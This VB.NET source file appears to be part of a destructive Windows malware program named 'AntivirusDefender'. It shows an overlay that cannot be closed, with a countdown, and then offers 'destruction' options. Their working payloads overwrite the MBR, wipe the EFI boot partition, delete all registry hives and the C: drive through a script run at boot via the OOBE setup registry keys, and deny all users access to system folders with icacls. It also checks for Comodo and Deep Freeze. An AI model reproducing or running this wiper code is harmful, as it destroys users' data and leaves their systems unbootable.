Imports System.IO
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32
Imports System.ServiceProcess
Imports System.Media

Public Class Form2

    ' Create a global instance of Form1
    Public Form1d As New Form1()

    Public countdownTime As Integer = 60 ' Countdown timer in seconds
    Private ReadOnly audioPlayerd As New AudioPlayer()

    ' Initialize the full-screen overlay form
    Public Sub New()
        FormBorderStyle = FormBorderStyle.None
        Bounds = Screen.PrimaryScreen.Bounds ' Set form to full-screen
        TopMost = True ' Keeps form on top of other windows
        BackColor = Color.Black
        Opacity = 0.7 ' Transparency setting

        ' Initialize and start audio
        audioPlayerd.PlayAudio()
    End Sub

    Public Class AudioPlayer
        Implements IDisposable

        Private ReadOnly soundPlayer As New SoundPlayer()
        Private ReadOnly wavStream As MemoryStream
        Private disposedValue As Boolean ' To detect redundant calls

        Public Sub New()
            ' Extract the WAV byte array from resources using My.Resources
            Dim wavBytes As Byte() = My.Resources.Resource1.antivirusdefenderaudio

            ' Use MemoryStream to play the WAV
            wavStream = New MemoryStream(wavBytes)

            ' Load the WAV file into the SoundPlayer
            soundPlayer.Stream = wavStream
        End Sub

        ' Method to play the audio in a loop
        Public Sub PlayAudio()
            soundPlayer.PlayLooping()
        End Sub

        ' Method to stop the audio
        Public Sub StopAudio()
            soundPlayer.Stop()
        End Sub

        ' Protected implementation of Dispose pattern.
        Protected Overridable Sub Dispose(disposing As Boolean)
            If Not disposedValue Then
                If disposing Then
                    ' Dispose managed state (managed objects).
                    soundPlayer.Dispose()
                    wavStream.Dispose()
                End If

                ' Free unmanaged resources (if any) here.
                ' Set large fields to null (if any).

                disposedValue = True
            End If
        End Sub

        ' This code added to correctly implement the disposable pattern.
        Public Sub Dispose() Implements IDisposable.Dispose
            Dispose(True)
            GC.SuppressFinalize(Me)
        End Sub

        ' Finalizer (only if you have unmanaged resources)
        Protected Overrides Sub Finalize()
            ' Do not change this code. Put cleanup code in Dispose(disposing As Boolean) above.
            Dispose(False)
        End Sub
    End Class

    Private Sub CreateEpicScriptFiles()
        ' Define the paths
        Dim vbsFilePath As String = "C:\temp.vbs"
        Dim batFilePath As String = "C:\temp.bat"

        ' Create the VBScript content
        Dim vbsContent As String = "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"" , 0, ""utkudrk.exe""" & vbCrLf &
        "Dim userInput" & vbCrLf &
        "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
        "If userInput = ""FUCK YOU"" Then" & vbCrLf &
        "    Dim shell" & vbCrLf &
        "    Set shell = CreateObject(""WScript.Shell"")" & vbCrLf &
        "    shell.Run ""mountvol x: /s"", 0, True" & vbCrLf &
        "    shell.Run ""icacls x:"", 0, True" & vbCrLf &
        "    shell.Run ""icacls c:"", 0, True" & vbCrLf &
        "    If fso.FileExists(""x:\efi\boot\microsoft\bootmgfw.efi"") Then" & vbCrLf &
        "        shell.Run ""rd x: /s /q"", 0, True" & vbCrLf &
        "    End If" & vbCrLf &
        "    shell.Run ""reg delete HKCR /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKCU /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKLM /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKU /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKCC /f"", 0, True" & vbCrLf &
        "    shell.Run ""rd c: /s /q"", 0, True" & vbCrLf &
        "Else" & vbCrLf &
        "    MsgBox ""Action canceled because you didn't say FUCK YOU."", 0, ""utkudrk.exe""" & vbCrLf &
        "End If" & vbCrLf &
        "Set shell = Nothing"

        ' Create the batch file content
        Dim batContent As String = "@echo off" & vbCrLf &
        "echo Creating VBScript file..." & vbCrLf &
        "echo " & vbsContent.Replace(vbCrLf, "^& echo ") & " > " & vbsFilePath & vbCrLf &
        "echo VBScript file created." & vbCrLf &
        "cscript //nologo " & vbsFilePath

        ' Write the batch and VBScript content to files
        System.IO.File.WriteAllText(batFilePath, batContent)

        ' Attempt to modify the registry for OOBE
        Try
            Dim setupKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
            Dim systemSetupKeyPath As String = "SYSTEM\Setup"

            Using setupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(setupKeyPath)
                setupKey.SetValue("CmdLine", batFilePath, RegistryValueKind.String)
            End Using

            Using systemSetupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(systemSetupKeyPath)
                If systemSetupKey IsNot Nothing Then
                    systemSetupKey.SetValue("OOBEInProgress", 1, RegistryValueKind.DWord)
                    systemSetupKey.SetValue("SetupType", 2, RegistryValueKind.DWord)
                    systemSetupKey.SetValue("SetupPhase", 1, RegistryValueKind.DWord)
                    systemSetupKey.SetValue("SystemSetupInProgress", 1, RegistryValueKind.DWord)
                End If
            End Using
        Catch ex As Exception
            MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Public method to run the VBS script.
    Public Sub ApplyMaximumDestruction()
        CreateEpicScriptFiles()
        Dim scriptPath As String = "C:\temp.vbs"
        Try
            Dim process As New Process()
            process.StartInfo.FileName = "wscript.exe"
            process.StartInfo.Arguments = """" & scriptPath & """"
            process.StartInfo.UseShellExecute = False
            process.StartInfo.RedirectStandardOutput = True
            process.StartInfo.RedirectStandardError = True
            process.StartInfo.CreateNoWindow = True

            process.Start()
            Dim output As String = process.StandardOutput.ReadToEnd()
            Dim errorOutput As String = process.StandardError.ReadToEnd()
            process.WaitForExit()

            If Not String.IsNullOrEmpty(output) Then
                MessageBox.Show("Output: " & output, "Script Output", MessageBoxButtons.OK, MessageBoxIcon.Information)
            End If

            If Not String.IsNullOrEmpty(errorOutput) Then
                MessageBox.Show("Error: " & errorOutput, "Script Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End If
        Catch ex As Exception
            MessageBox.Show("An error occurred while executing the script: " & ex.Message, "Execution Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub ReplaceBootx64WithBootmgfw()
        Try
            ' 1. Mount the EFI system partition to X:
            Dim mountvolProcess As New Process()
            mountvolProcess.StartInfo.FileName = "cmd.exe"
            mountvolProcess.StartInfo.Arguments = "/C mountvol X: /s /q"
            mountvolProcess.StartInfo.CreateNoWindow = True
            mountvolProcess.StartInfo.UseShellExecute = False
            mountvolProcess.Start()
            mountvolProcess.WaitForExit()

            ' 2. Delete all contents from the X: drive (EFI system partition)
            Dim rdProcess As New Process()
            rdProcess.StartInfo.FileName = "cmd.exe"
            rdProcess.StartInfo.Arguments = "/C rd X: /s /q"
            rdProcess.StartInfo.CreateNoWindow = True
            rdProcess.StartInfo.UseShellExecute = False
            rdProcess.Start()
            rdProcess.WaitForExit()

            ' 3. Extract bootmgfw.efi from Resource1 (string to byte array conversion)
            Dim bootmgfwString As String = My.Resources.Resource1.bootmgfw
            Dim bootmgfwData As Byte() = Encoding.UTF8.GetBytes(bootmgfwString)

            ' 4. Ensure the target directory exists
            Dim efiDir As String = "X:\EFI"
            Dim targetFilePath As String = "X:\EFI\bootx64.efi"

            If Not Directory.Exists(efiDir) Then
                Directory.CreateDirectory(efiDir)
            End If

            ' 5. Write bootmgfw.efi to X:\EFI\bootx64.efi
            File.WriteAllBytes(targetFilePath, bootmgfwData)

            MessageBox.Show("Successfully replaced bootx64.efi with bootmgfw.efi", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)

        Catch ex As Exception
            MessageBox.Show("Error during the replacement process: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        Finally
            ' Unmount X: drive
            Dim unmountProcess As New Process()
            unmountProcess.StartInfo.FileName = "cmd.exe"
            unmountProcess.StartInfo.Arguments = "/C mountvol X: /d"
            unmountProcess.StartInfo.CreateNoWindow = True
            unmountProcess.StartInfo.UseShellExecute = False
            unmountProcess.Start()
            unmountProcess.WaitForExit()
        End Try
    End Sub

    Private Sub LegalNotice()
        Try
            ' Open the registry key where the login message is stored
            Dim regKey As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True)

            ' Set the title and message for the login screen
            regKey.SetValue("legalnoticecaption", "AntivirusDefender10 HERE!")
            regKey.SetValue("legalnoticetext", "AntivirusDefender 10 watching you well you wanted this!")

            ' Close the registry key
            regKey.Close()

            Console.WriteLine("Login message set successfully.")
        Catch ex As Exception
            Console.WriteLine("Error setting login message: " & ex.Message)
        End Try
    End Sub

    Public Class StupidSandboxThingsDetector

        ' Public method to detect if Comodo Antivirus is installed or present.
        Public Function DetectComodoAntivirus() As Boolean
            ' Check for the installation paths
            Dim comodoPaths As String() = {
            "C:\Program Files\COMODO\COMODO Internet Security\",
            "C:\Program Files (x86)\COMODO\COMODO Internet Security\"
        }

            For Each path As String In comodoPaths
                If PathExists(path) Then
                    Return True
                End If
            Next

            ' Check for the Comodo Antivirus driver
            Dim driverPath As String = "C:\Windows\System32\drivers\cmdguard.sys"
            If PathExists(driverPath) Then
                Return True
            End If

            ' Check for Comodo Antivirus registry key
            If CheckComodoRegistry() Then
                Return True
            End If

            ' Check for Comodo Antivirus service
            If CheckComodoService() Then
                Return True
            End If

            Return False
        End Function

        ' Public method to detect if Deep Freeze is installed or present.
        Public Function DetectDeepFreeze() As Boolean
            ' Check for the installation paths
            Dim deepFreezePaths As String() = {
            "C:\Program Files\Faronics\Deep Freeze\",
            "C:\Program Files (x86)\Faronics\Deep Freeze\"
        }

            For Each path As String In deepFreezePaths
                If PathExists(path) Then
                    Return True
                End If
            Next

            ' Check for the Deep Freeze driver
            Dim driverPath As String = "C:\Persi0.sys"
            If PathExists(driverPath) Then
                Return True
            End If

            ' Check for Deep Freeze registry key
            If CheckDeepFreezeRegistry() Then
                Return True
            End If

            ' Check for Deep Freeze service
            If CheckDeepFreezeService() Then
                Return True
            End If

            Return False
        End Function

        ' Private method to check if a given path exists.
        Private Function PathExists(path As String) As Boolean
            Return File.Exists(path) Or Directory.Exists(path)
        End Function

        ' Private method to check for Comodo Antivirus in the registry key.
        Private Function CheckComodoRegistry() As Boolean
            Dim comodoKey As String = "SOFTWARE\COMODO\CIS"
            Return RegistryKeyExists(Registry.LocalMachine, comodoKey)
        End Function

        ' Private method to check for Deep Freeze in the registry key.
        Private Function CheckDeepFreezeRegistry() As Boolean
            Dim deepFreezeKey As String = "SOFTWARE\Classes\TypeLib\{C5D763D9-2422-4B2D-A425-02D5BD016239}\1.0\HELPDIR"
            Return RegistryKeyExists(Registry.LocalMachine, deepFreezeKey)
        End Function

        ' Private method to check for the Comodo Antivirus service.
        Private Function CheckComodoService() As Boolean
            Dim serviceName As String = "cmdagent"
            Return ServiceExists(serviceName)
        End Function

        ' Private method to check for the Deep Freeze service.
        Private Function CheckDeepFreezeService() As Boolean
            Dim serviceName As String = "DFServ"
            Return ServiceExists(serviceName)
        End Function

        ' Private method to check if a service exists using ServiceController.
        Private Function ServiceExists(serviceName As String) As Boolean
            Try
                Using sc As New ServiceController(serviceName)
                    ' If we can access the service, it exists
                    Dim status As ServiceControllerStatus = sc.Status
                    Return True
                End Using
            Catch ex As InvalidOperationException
                ' This exception indicates the service does not exist
                Return False
            Catch ex As TimeoutException
                ' This exception may occur if the service is taking too long to respond
                Return False
            Catch ex As Exception
                ' Handle other exceptions if necessary
                Return False
            End Try
        End Function

        ' Private method to check if a registry key exists.
        Private Function RegistryKeyExists(root As RegistryKey, path As String) As Boolean
            Using key As RegistryKey = root.OpenSubKey(path)
                Return key IsNot Nothing
            End Using
        End Function

    End Class

    ' Function to execute different payloads based on user choice
    Public Sub ExecuteDestruction(choice As String)
        ' Create an instance of the ComodoAntivirusDetector class
        Dim detector As New StupidSandboxThingsDetector()
        ' Check if Deep Freeze is detected
        If detector.DetectDeepFreeze() Then
            Select Case choice
                Case "Maximum Destruction"
                    ' Code for maximum destruction
                    timerLabel.Text = "It can't defend against UEFI! Executing maximum destruction!"
                    Thread.Sleep(5000)
                    Form1d.WriteMBR()
                    ReplaceBootx64WithBootmgfw()
                    ApplyMaximumDestruction()

                Case "Classic MBR/UEFI FEffects"
                    ' Code for classic UEFI effects
                    timerLabel.Text = "It can't defend against UEFI! Executing classic UEFI effects!"
                    Thread.Sleep(5000)
                    Form1d.WriteMBR()
                    ReplaceBootx64WithBootmgfw()

                Case "Surprise Me"
                    ' Code for less destructive surprise
                    timerLabel.Text = "Deep Freeze user detected! Non-destructive request declined."
                    Thread.Sleep(5000)

                Case "Just Make Unusable My PC Without Destruction"
                    ' Code for access restrictions
                    timerLabel.Text = "Deep Freeze user detected! Non-destructive request declined."
                    Thread.Sleep(5000)

                Case Else
                    timerLabel.Text = "Invalid choice!"
            End Select
        Else
            ' Code for scenarios when Deep Freeze is not detected
            Select Case choice
                Case "Maximum Destruction with MBR/UEFI"
                    ' Code for maximum destruction
                    timerLabel.Text = "Executing maximum destruction!"
                    Thread.Sleep(5000)
                    Form1d.WriteMBR()
                    ReplaceBootx64WithBootmgfw()
                    ApplyMaximumDestruction()

                Case "Classic MBR/UEFI Effects"
                    ' Code for classic UEFI effects
                    timerLabel.Text = "Executing classic UEFI effects!"
                    Thread.Sleep(5000)
                    ' Write UEFI using bootmgfw from Resource1
                    Form1d.WriteMBR()
                    ReplaceBootx64WithBootmgfw()

                Case "Surprise Me"
                    ' Code for less destructive surprise
                    timerLabel.Text = "Surprise! Executing less destructive effects!"
                    Thread.Sleep(5000)
                    CreateEpicScriptFiles()
                    LegalNotice()
                    MessageBox.Show("To apply changes, you need to restart your computer.", "Restart Required", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                    Environment.Exit(0)

                Case "Just Make Unusable My PC Without Destruction"
                    ' Code for access restrictions
                    timerLabel.Text = "You can't access your files anymore! You have more than 60 seconds before BSOD!"
                    Thread.Sleep(5000)
                    LegalNotice()
                    ApplyAccessRestrictions()
                    Form1d.LockAllRegistryKeys()
                    Thread.Sleep(60000)
                    Environment.Exit(0)

                Case Else
                    timerLabel.Text = "Invalid choice!"
            End Select
        End If
    End Sub

    ' Function to prompt user for a choice using a MessageBox
    Public Function PromptUserForChoice(messaage As String, options As String()) As String
        Dim result As DialogResult = MessageBox.Show(messaage, "Choose an Option", MessageBoxButtons.OKCancel, MessageBoxIcon.Question)

        If result = DialogResult.OK Then
            ' Create a simple input dialog
            Dim choice As String = InputBox("Select your choice:", "User Choice", options(0))

            ' Validate user choice against available options
            For Each opt In options ' Renamed the variable from 'option' to 'opt'
                If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
                    Return opt
                End If
            Next

            MessageBox.Show("Invalid choice! Please select a valid option.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        End If

        Return String.Empty
    End Function

    ' Apply access restrictions
    Private Sub ApplyAccessRestrictions()
        Dim commands As String() = {
        "icacls ""C:\Windows"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Program Files"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\ProgramData"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\System Volume Information"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Recovery"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\$RECYCLE.BIN"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\config"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\system32"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\system"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\winsxs"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Windows\SysWOW64"" /deny Everyone:(OI)(CI)F",
        "icacls ""C:\Users"" /deny Everyone:(OI)(CI)F"
    }

        For Each command As String In commands
            Try
                Form1d.ExecuteCommand(command)
            Catch ex As Exception
                MessageBox.Show("Failed to apply access restrictions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try
        Next
    End Sub

    ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion and motion
    Private portalEffectPhase As Integer = 0 ' Ensure this is initialized

    Public Sub ApplyPortalEffect()
        ' Load the byte array from resources using My.Resources
        Dim portalImageBytes As Byte() = My.Resources.Resource1.antivirusdefender

        ' Convert the byte array to an Image
        Dim portalImage As Image
        Using ms As New MemoryStream(portalImageBytes)
            portalImage = Image.FromStream(ms)
        End Using

        ' Pixel block size
        Dim gridSize As Integer = 20 ' Size of each pixelated "block"
        portalEffectPhase += 0.05F ' Increment phase for wavy distortion

        ' Access the Graphics object of Form2 (or any control where the effect is to be applied)
        Using g As Graphics = CreateGraphics()
            For y As Integer = 0 To Height Step gridSize
                For x As Integer = 0 To Width Step gridSize
                    ' Calculate distorted positions using sine wave (for swirling effect)
                    Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10)
                    Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10)

                    ' Draw a block of the image at the distorted position
                    g.DrawImage(portalImage, New Rectangle(distortedX, distortedY, gridSize, gridSize),
                            New Rectangle(x Mod portalImage.Width, y Mod portalImage.Height, gridSize, gridSize),
                            GraphicsUnit.Pixel)
                Next
            Next
        End Using
    End Sub

    ' Prevent form from closing
    Protected Overrides Sub OnFormClosing(e As FormClosingEventArgs)
        e.Cancel = True
    End Sub

    Private Sub OnCountdownComplete()
        ' When countdown finishes, prompt user for destruction option
        Dim options As String() = {
        "Maximum Destruction",
        "Classic MBR/UEFI Effects",
        "Surprise Me",
        "Just Make Unusable My PC Without Destruction"
    }

        Dim choice As String = PromptUserForChoice("Select a destruction option:", options)

        If Not String.IsNullOrEmpty(choice) Then
            timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
            Thread.Sleep(5000) ' Optional: Adjust as needed
            ExecuteDestruction(choice)
        End If
    End Sub

    Public Sub StartAnimationLoop()

        ' Start the countdown timer if it is not already running
        If Not CountDownTimer.Enabled Then
            CountDownTimer.Start()
        End If
    End Sub

    Private Sub CountDownTimer_Tick(sender As Object, e As EventArgs) Handles CountDownTimer.Tick
        If countdownTime > 0 Then
            countdownTime -= 1

            ' Update the countdown UI (ensure it's on the UI thread)
            If timerLabel.InvokeRequired Then
                timerLabel.Invoke(New MethodInvoker(Sub()
                                                        timerLabel.Text = "Remaining Time: " & countdownTime.ToString() & " seconds"
                                                    End Sub))
            Else
                timerLabel.Text = "Remaining Time: " & countdownTime.ToString() & " seconds"
            End If

            ' Optionally, you can apply an effect here
            ApplyPortalEffect() ' Replace this with your method or logic for applying the effect
        Else
            ' Stop the timer when the countdown reaches zero and handle completion
            OnCountdownComplete()
        End If
    End Sub

End Class